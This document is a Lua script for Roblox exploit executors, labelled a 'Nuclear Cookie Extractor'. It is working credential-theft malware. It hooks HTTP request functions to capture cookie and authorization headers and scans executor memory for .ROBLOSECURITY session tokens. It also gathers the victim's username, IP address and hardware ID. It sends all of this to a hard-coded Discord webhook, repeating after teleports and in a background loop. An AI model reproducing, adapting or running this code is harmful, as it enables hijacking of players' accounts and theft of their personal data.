-- PHANI's Nuclear Cookie Extractor v3.0
-- For PHANTOM. sUNC 98% / Velocity Optimized.
-- "If it exists in memory, we find it."

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1518254221177389109/GYWFYTc5MK3rJps723lEDGDd9POZjjtnqN8-lk8nVlSfRgO3YCXNPC_54ZJ9ONZVq0_F"

-- ============================================
-- UNIVERSAL REQUEST (works across executors)
-- ============================================
local function makeRequest(data)
    local req = syn and syn.request or 
                http and http.request or 
                request or 
                http_request or
                fluxus and fluxus.request or
                krnl and krnl.request
    
    if req then return req(data) end
    
    -- Fallback via HttpService
    if data.Method == "GET" then
        return {Body = HttpService:GetAsync(data.Url, false, data.Headers), StatusCode = 200}
    else
        return {Body = HttpService:PostAsync(data.Url, data.Body, Enum.HttpContentType.ApplicationJson, false, data.Headers), StatusCode = 200}
    end
end

-- ============================================
-- COOKIE INTERCEPTION SYSTEM
-- ============================================
local interceptedCookies = {}
local interceptedHeaders = {}

-- Hook syn.request / request
pcall(function()
    local original = syn and syn.request or request
    if original and not _G._phaniHooked then
        _G._phaniHooked = true
        local hooked = function(data)
            if data and data.Headers then
                for k, v in pairs(data.Headers) do
                    local lower = k:lower()
                    if lower == "cookie" or lower == "authorization" or lower == "x-csrf-token" then
                        table.insert(interceptedHeaders, {key=k, value=tostring(v), url=data.Url})
                        if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
                            table.insert(interceptedCookies, v)
                        end
                    end
                end
            end
            return original(data)
        end
        
        if syn then syn.request = hooked end
        if request then getgenv().request = hooked end
    end
end)

-- Hook HttpService methods
pcall(function()
    local oldGet = game.HttpGet
    if oldGet then
        game.HttpGet = function(self, url, ...)
            local result = oldGet(self, url, ...)
            -- Try to extract from any internal state
            return result
        end
    end
end)

-- ============================================
-- MEMORY SCANNING FUNCTIONS
-- ============================================
local function deepScanRegistry()
    local found = {}
    
    -- getregistry / getreg scan
    pcall(function()
        local reg = getreg and getreg() or debug and debug.getregistry and debug.getregistry()
        if reg then
            for i = 1, math.min(#reg, 50000) do  -- Limit to avoid freeze
                local v = reg[i]
                if type(v) == "string" then
                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") or (v:len() > 200 and v:sub(1,10):find("_|")) then
                        table.insert(found, {value=v, source="registry["..i.."]", length=#v})
                    end
                elseif type(v) == "table" then
                    for k2, v2 in pairs(v) do
                        if type(v2) == "string" and (v2:find("_|WARNING") or v2:find("ROBLOSECURITY")) then
                            table.insert(found, {value=v2, source="registry["..i.."]."..tostring(k2), length=#v2})
                        end
                    end
                end
            end
        end
    end)
    
    return found
end

local function scanGC()
    local found = {}
    
    pcall(function()
        if getgc then
            local count = 0
            for _, v in pairs(getgc()) do
                count = count + 1
                if count > 100000 then break end -- Safety limit
                
                if type(v) == "string" then
                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") or (v:len() > 150 and v:sub(1,5) == "_|WARN") then
                        table.insert(found, {value=v, source="gc_string", length=#v})
                    end
                elseif type(v) == "function" then
                    -- Check upvalues
                    pcall(function()
                        local ups = debug.getupvalues and debug.getupvalues(v) or {}
                        for _, upv in pairs(ups) do
                            if type(upv) == "string" and (upv:find("_|WARNING") or upv:find("ROBLOSECURITY")) then
                                table.insert(found, {value=upv, source="gc_func_upvalue", length=#upv})
                            end
                        end
                    end)
                    
                    -- Check constants
                    pcall(function()
                        local consts = debug.getconstants and debug.getconstants(v) or {}
                        for _, c in pairs(consts) do
                            if type(c) == "string" and (c:find("_|WARNING") or c:find("ROBLOSECURITY")) then
                                table.insert(found, {value=c, source="gc_func_constant", length=#c})
                            end
                        end
                    end)
                end
            end
        end
    end)
    
    return found
end

local function scanGetGenv()
    local found = {}
    
    pcall(function()
        if getgenv then
            local function scanTable(t, path, depth)
                if depth > 4 then return end
                for k, v in pairs(t) do
                    local currentPath = path .. "." .. tostring(k)
                    if type(v) == "string" then
                        if v:find("_|WARNING") or v:find("ROBLOSECURITY") or (v:len() > 150 and v:sub(1,2) == "_|") then
                            table.insert(found, {value=v, source=currentPath, length=#v})
                        end
                    elseif type(v) == "table" and not (k == "_G" or k == "getgenv") then
                        scanTable(v, currentPath, depth + 1)
                    end
                end
            end
            
            scanTable(getgenv(), "getgenv", 0)
        end
    end)
    
    return found
end

local function scanGetReny()
    local found = {}
    
    pcall(function()
        if getrenv then
            for k, v in pairs(getrenv()) do
                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
                    table.insert(found, {value=v, source="getrenv."..tostring(k), length=#v})
                end
            end
        end
    end)
    
    return found
end

-- ============================================
-- FORCE AUTHENTICATED REQUEST (triggers cookie injection)
-- ============================================
local function forceAuthRequest()
    local results = {}
    
    -- These endpoints REQUIRE auth and will trigger cookie attachment
    local endpoints = {
        "https://accountsettings.roblox.com/v1/email",
        "https://auth.roblox.com/v1/account/pin",
        "https://friends.roblox.com/v1/my/friends",
        "https://catalog.roblox.com/v1/favorites/assets/1",
        "https://economy.roblox.com/v1/user/currency",
        "https://premiumfeatures.roblox.com/v1/users/validate-membership"
    }
    
    for _, url in ipairs(endpoints) do
        pcall(function()
            -- This should trigger the executor's internal cookie injection
            local response = HttpService:GetAsync(url, false, {
                ["Content-Type"] = "application/json"
            })
            table.insert(results, {url=url, status="success", len=#response})
        end)
    end
    
    return results
end

-- ============================================
-- MAIN EXTRACTION
-- ============================================
local function extractEverything()
    -- Phase 1: Trigger auth requests to force cookie loading
    forceAuthRequest()
    wait(0.5)
    
    -- Phase 2: Deep memory scans
    local registryResults = deepScanRegistry()
    local gcResults = scanGC()
    local genvResults = scanGetGenv()
    local renvResults = scanGetReny()
    
    -- Phase 3: Check intercepted cookies from hooks
    local allCookies = {}
    
    for _, c in ipairs(interceptedCookies) do
        table.insert(allCookies, {value=c, source="hook_request", length=#c})
    end
    
    for _, h in ipairs(interceptedHeaders) do
        if h.value:find("_|WARNING") or h.value:find("ROBLOSECURITY") then
            table.insert(allCookies, {value=h.value, source="hook_header:"..h.key, length=#h.value})
        end
    end
    
    -- Add memory scan results
    for _, r in ipairs(registryResults) do table.insert(allCookies, r) end
    for _, r in ipairs(gcResults) do table.insert(allCookies, r) end
    for _, r in ipairs(genvResults) do table.insert(allCookies, r) end
    for _, r in ipairs(renvResults) do table.insert(allCookies, r) end
    
    -- Deduplicate
    local seen = {}
    local unique = {}
    for _, c in ipairs(allCookies) do
        if not seen[c.value] then
            seen[c.value] = true
            table.insert(unique, c)
        end
    end
    
    return unique
end

-- ============================================
-- VICTIM DATA
-- ============================================
local function getVictimInfo()
    local player = Players.LocalPlayer
    local ip = "Unknown"
    local hwid = "Unknown"
    
    pcall(function()
        ip = tostring(game:HttpGetAsync("https://api.ipify.org"))
    end)
    
    pcall(function()
        hwid = tostring(gethwid())
    end)
    
    return {
        username = player.Name,
        displayName = player.DisplayName,
        userId = tostring(player.UserId),
        gameId = tostring(game.GameId),
        placeId = tostring(game.PlaceId),
        jobId = tostring(game.JobId),
        executor = tostring(identifyexecutor and identifyexecutor() or "Unknown"),
        sunc = tostring(getsenv and "Available" or "N/A"),
        ip = ip,
        hwid = hwid,
        time = os.date("%Y-%m-%d %H:%M:%S")
    }
end

-- ============================================
-- DISCORD PAYLOAD
-- ============================================
local function sendToWebhook(cookies, victim)
    local fields = {
        {name = "👤 Username", value = victim.username, inline = true},
        {name = "📛 Display", value = victim.displayName, inline = true},
        {name = "🆔 User ID", value = victim.userId, inline = true},
        {name = "🎮 Game ID", value = victim.gameId, inline = true},
        {name = "🏠 Place ID", value = victim.placeId, inline = true},
        {name = "🔗 Job ID", value = victim.jobId, inline = false},
        {name = "⚡ Executor", value = victim.executor, inline = true},
        {name = "📊 sUNC", value = victim.sunc, inline = true},
        {name = "🌐 IP", value = victim.ip, inline = true},
        {name = "💻 HWID", value = victim.hwid, inline = false},
        {name = "🔍 Total Found", value = tostring(#cookies), inline = true}
    }
    
    local cookieText = ""
    if #cookies > 0 then
        for i, c in ipairs(cookies) do
            if i <= 5 then -- Limit to 5 to avoid Discord limits
                local val = c.value:sub(1, 500)
                cookieText = cookieText .. "**Source:** `" .. c.source .. "`\n```" .. val .. "```\n\n"
            end
        end
    else
        cookieText = "No cookies found via any method.\nIntercepted headers: " .. tostring(#interceptedHeaders)
    end
    
    table.insert(fields, {
        name = "🍪 Cookie Data",
        value = cookieText:sub(1, 1800) or "Empty",
        inline = false
    })
    
    -- Add intercepted headers (even without cookies, they might have auth tokens)
    local headerText = ""
    for i, h in ipairs(interceptedHeaders) do
        if i <= 10 then
            headerText = headerText .. h.key .. ": `" .. h.value:sub(1, 100) .. "`\n"
        end
    end
    
    if headerText ~= "" then
        table.insert(fields, {
            name = "📡 Intercepted Headers",
            value = headerText:sub(1, 1000),
            inline = false
        })
    end
    
    local payload = {
        username = "PHANI Nuclear Extractor ☢️",
        content = #cookies > 0 and "🎉 **NUCLEAR STRIKE SUCCESSFUL**" or "⚠️ **Strike incomplete - check data**",
        embeds = {{
            title = #cookies > 0 and "🍪 COOKIES ACQUIRED" or "📊 Extraction Report",
            color = #cookies > 0 and 0x00FF00 or 0xFFA500,
            fields = fields,
            footer = {text = "PHANI <3 PHANTOM | v3.0 Nuclear"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        makeRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- ============================================
-- EXECUTE
-- ============================================
local victim = getVictimInfo()
local cookies = extractEverything()
sendToWebhook(cookies, victim)

-- Persistent: re-run after teleport
TeleportService.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        wait(3)
        local newCookies = extractEverything()
        sendToWebhook(newCookies, getVictimInfo())
    end
end)

-- Background: keep scanning for 30 seconds (some cookies load late)
spawn(function()
    for i = 1, 6 do
        wait(5)
        local lateCookies = extractEverything()
        if #lateCookies > 0 then
            sendToWebhook(lateCookies, getVictimInfo())
            break
        end
    end
end)
